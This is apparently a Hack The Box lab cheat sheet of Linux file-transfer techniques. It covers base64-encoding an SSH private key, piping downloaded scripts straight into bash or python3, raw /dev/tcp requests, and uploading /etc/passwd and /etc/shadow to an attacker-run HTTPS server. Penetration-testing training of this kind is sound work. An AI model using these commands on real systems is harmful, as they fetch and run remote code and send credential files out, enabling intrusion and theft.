## Base64 Encoding / Decoding
#### Pwnbox - Check File MD5 hash

```Shell
3kjS@htb[/htb]$ md5sum id_rsa 
4e301756a07ded0a2dd6953abf015278  id_rsa
```

#### Pwnbox - Encode SSH Key to Base64

```Shell
3kjS@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NI
```

#### Linux - Decode the File

```Shell
3kjS@htb[/htb]$ echo -n 

'LS0tLS1CRUdJTiBPUEVOU1NI' | base64 -d > id_rsa
```

#### Linux - Confirm the MD5 Hashes Match

```Shell
3kjS@htb[/htb]$ md5sum id_rsa 

4e301756a07ded0a2dd6953abf015278 id_rsa
```

## Web Downloads with Wget and cURL

#### Download a File Using wget

```Shell
3kjS@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
#### Download a File Using cURL

```Shell
3kjS@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Fileless Attacks Using Linux

#### Fileless Download with cURL

```Shell
3kjS@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Fileless Download with wget

```Shell
3kjS@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3 Hello World!
```

## Download with Bash (/dev/tcp)

#### Connect to the Target Webserver

```Shell
3kjS@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```Shell
3kjS@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```Shell
3kjS@htb[/htb]$ cat <&3
```

## SSH Downloads

#### Enabling the SSH Server

```Shell
3kjS@htb[/htb]$ sudo systemctl enable ssh
```
#### Starting the SSH Server

```Shell
3kjS@htb[/htb]$ sudo systemctl start ssh
```

#### Checking for SSH Listening Port

```Shell
3kjS@htb[/htb]$ netstat -lnpt
```

#### Linux - Downloading Files Using SCP

```Shell
3kjS@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
```

## Web Upload

#### Pwnbox - Start Web Server

```Shell
3kjS@htb[/htb]$ sudo python3 -m pip install --user uploadserver
```
#### Pwnbox - Create a Self-Signed Certificate

```Shell
3kjS@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
#### Pwnbox - Start Web Server

```Shell
3kjS@htb[/htb]$ mkdir https && cd https
```

```Shell
3kjS@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

#### Linux - Upload Multiple Files

```Shell
3kjS@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Alternative Web File Transfer Method

#### Linux - Creating a Web Server with Python3

```Shell
3kjS@htb[/htb]$ python3 -m http.server
```
#### Linux - Creating a Web Server with Python2.7

```Shell
3kjS@htb[/htb]$ python2.7 -m SimpleHTTPServer
```
#### Linux - Creating a Web Server with PHP

```Shell
3kjS@htb[/htb]$ php -S 0.0.0.0:8000
```
#### Linux - Creating a Web Server with Ruby

```Shell
3kjS@htb[/htb]$ ruby -run -ehttpd . -p8000
```
#### Download the File from the Target Machine onto the Pwnbox

```Shell
3kjS@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```

## SCP Upload
#### File Upload using SCP

```Shell
3kjS@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

